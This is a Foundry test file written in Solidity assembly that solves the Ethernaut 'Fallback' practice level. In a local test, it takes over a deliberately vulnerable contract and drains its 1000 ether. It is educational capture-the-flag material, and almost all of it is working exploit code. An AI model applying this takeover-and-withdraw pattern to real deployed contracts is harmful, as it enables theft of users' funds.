pragma solidity ^0.8.0;

import "forge-std/Test.sol";
import "../src/Fallback.sol";

contract ASMFallback is Test {
    Fallback public target;
    address payable public attacker = payable(address(420));

    function setUp() public {
        target = new Fallback();
        vm.deal(attacker, 1 ether);
        vm.deal(address(target), 1000 ether);
    }

    modifier attack() {
        vm.startPrank(attacker);
        _;
        vm.stopPrank();
    }

    function testAttackFallback() public attack {
        assembly {
            // initialize a pointer to free memory
            // the *value* of the pointer is at the 0x40 memory address
            // it should be 0x80
            let ptr := mload(0x40)

            // fetch the target address by loading the data stored at the storage slot of target
            // the variables are not written to memory automatically
            // but stored on the stack, then the compiler make it available when we need it
            let targetAddress := sload(target.slot)

            // now we need to grab the function signature
            mstore(ptr, "contribute()") // 0x636f6e747269627574652829

            // keccak operates on a memory location and hashes x bytes
            // in our case we need 0xC = 12 bytes
            // it returns a 32 byte word of which we need the first 4 bytes
            // which is why we shift right 224 bits
            // however we want to store adjacent to our next memory location
            // without overwriting it, so we shift left 224 bits to get the correct padding
            let h := shl(224, shr(224, keccak256(ptr, 0x0c)))

            // update the pointer and store the data
            ptr := add(ptr, 0x0c)
            mstore(ptr, h)

            // first we make a contribution of 1 wei
            let success :=
                call(
                    gas(), // gas
                    targetAddress, // will be sending to target
                    1, // send 1 wei
                    ptr, // args offset - we can use our pointer
                    0x4, // args length - 4 bytes
                    0, // return offset - nothing
                    0 // return length - nothing
                )

            // check we are successful
            if eq(success, 0) { revert(0, 0) }

            // now we call fallback with one wei
            success :=
                call(
                    gas(), // gas
                    targetAddress, // will be sending to target
                    1, // send 1 wei
                    0, // args offset - nothing
                    0, // args length - nothing
                    0, // return offset - nothing
                    0 // return length - nothing
                )

            // update the pointer
            ptr := add(ptr, 0x04)

            // same again, load up withdraw
            mstore(ptr, "withdraw()")

            // hash and dance
            // withdraw is 10 bytes long
            let w := shl(224, shr(224, keccak256(ptr, 0x0a)))

            // shift our pointer to the end of the keccak hash
            ptr := add(ptr, 0x0a)

            // store the selector
            mstore(ptr, w)

            // now we call withdraw
            success :=
                call(
                    gas(), // gas
                    targetAddress, // will be sending to target
                    0, // send no wei
                    ptr, // args offset - pointer
                    0x4, // args length - just the selector
                    0, // return offset - nothing
                    0 // return length - nothing
                )

            // check we are successful
            if eq(success, 0) { revert(0, 0) }
        }

        // assertions
        assertEq(target.owner(), attacker);
        assertEq(address(target).balance, 0);
        assertEq(address(attacker).balance, 1001 ether);
    }
}
